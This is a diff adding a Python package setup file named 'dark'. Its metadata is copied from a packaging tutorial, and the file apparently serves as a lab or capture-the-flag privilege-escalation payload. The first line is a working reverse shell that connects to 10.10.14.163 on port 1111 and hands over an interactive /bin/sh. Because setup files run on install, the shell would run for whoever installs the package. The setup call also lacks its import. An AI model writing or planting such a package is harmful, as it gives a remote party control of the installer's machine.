@@ -1,0 +1,11 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.163",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+setup(name='dark',
+version='0.1',
+description='The funniest joke in the world',
+url='http://github.com/storborg/funniest',
+author='Flying Circus',
+author_email='flyingcircus@example.com',
+license='MIT',
+packages=['dark'],
+zip_safe=False)
